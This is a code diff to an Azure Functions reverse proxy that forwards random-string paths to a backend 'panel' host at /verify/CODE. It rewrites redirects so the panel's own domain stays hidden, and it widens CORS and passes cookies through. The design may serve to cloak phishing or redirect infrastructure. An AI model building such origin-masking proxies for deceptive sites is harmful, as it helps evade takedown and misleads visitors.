@@ -4,28 +4,28 @@ module.exports = async function (context, req) {
     let path = req.headers['x-ms-original-url'] || req.url || '/';
     try { if (path.startsWith('http')) { const u = new URL(path); path = u.pathname + u.search; } } catch(e){}
     
-    path = path.replace(/^\/api\/proxy/, '') || '/';
+    // Remove the proxy prefix
+    path = path.replace(/^\/api\/proxy/, '');
+    
+    // 🚨 SMART ROUTING 🚨
+    const parts = path.split('/').filter(Boolean);
+    let originalRandomString = '';
+    
+    if (parts.length === 2 && parts[1].length > 4) {
+        originalRandomString = parts[0]; // Save the random string
+        path = `/verify/${parts[1]}`;
+    } else if (parts.length === 1 && parts[0].length > 4) {
+        path = `/verify/${parts[0]}`;
+    }
+
     if (!path.startsWith('/')) path = '/' + path;
 
-    const parts = path.split('/').filter(Boolean);
-    let code = '';
-
-    // Extract code from POST body, query, or URL
-    if (req.body && req.body.code) {
-        code = req.body.code;
-    } else if (req.query && req.query.code) {
-        code = req.query.code;
-    } else if (parts.length >= 2) {
-        code = parts[1];
-    } else if (parts.length === 1) {
-        code = parts[0];
+    if (req.query && Object.keys(req.query).length > 0) {
+        const qs = new URLSearchParams(req.query).toString();
+        if (!path.includes('?')) path += '?' + qs;
     }
 
-    if (code) {
-        path = `/verify/${code}`;
-    }
-
-    context.log(`Forwarding ${req.method} to: ${path}`);
+    context.log('Forwarding to:', path);
 
     const forwardHeaders = {
         'Host': PANEL,
@@ -43,43 +43,41 @@ module.exports = async function (context, req) {
     }
 
     try {
-        let currentUrl = `https://${PANEL}${path}`;
-        let r;
+        const r = await fetch(`https://${PANEL}${path}`, {
+            method: req.method,
+            headers: forwardHeaders,
+            body: body,
+            redirect: 'manual'
+        });
 
-        // Follow redirects (Flask 302 to /l/CODE)
-        for (let hop = 0; hop < 5; hop++) {
-            r = await fetch(currentUrl, {
-                method: req.method,
-                headers: forwardHeaders,
-                body: body,
-                redirect: 'manual'
-            });
-
-            const loc = r.headers.get('location');
-            if (r.status >= 300 && r.status < 400 && loc) {
-                let finalUrl = new URL(loc, currentUrl).toString();
-                finalUrl = finalUrl.replace(/^https:\/\/(www\.)?tute\.ink/, `https://${PANEL}`);
-                currentUrl = finalUrl;
-                req.method = 'GET';
-                body = undefined;
-                continue;
-            }
-            break;
-        }
-
-        let responseBody = await r.text();
+        const responseBody = await r.text();
         const contentType  = r.headers.get('content-type') || 'text/html';
+
+        // 🚨 REWRITE REDIRECTS TO STAY ON THE RANDOM STRING 🚨
+        let location = r.headers.get('location') || '';
+        if (location.startsWith(`https://${PANEL}`) || location.startsWith(`https://www.${PANEL}`)) {
+            // If the panel redirects to /l/CODE, rewrite it to /RANDOMSTRING/CODE
+            if (location.includes('/l/') && originalRandomString) {
+                const code = location.split('/l/')[1];
+                location = `/${originalRandomString}/${code}`;
+            } else {
+                const azureHost = req.headers['host'] || context.req.headers['host'];
+                location = location.replace(/^https:\/\/(www\.)?tute\.ink/, `https://${azureHost}`);
+            }
+        }
 
         const respHeaders = {
             'Content-Type': contentType,
             'Access-Control-Allow-Origin': '*',
+            'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, OPTIONS',
+            'Access-Control-Allow-Headers': 'Content-Type, Authorization',
             'Cache-Control': 'no-store, no-cache, must-revalidate'
         };
-        
+        if (location) respHeaders['Location'] = location;
         const setCookie = r.headers.get('set-cookie');
         if (setCookie) respHeaders['Set-Cookie'] = setCookie;
 
-        context.res = { status: 200, headers: respHeaders, body: responseBody };
+        context.res = { status: r.status, headers: respHeaders, body: responseBody };
     } catch (e) {
         context.log('Error:', e.message);
         context.res = { status: 500, body: 'Proxy Error: ' + e.message };
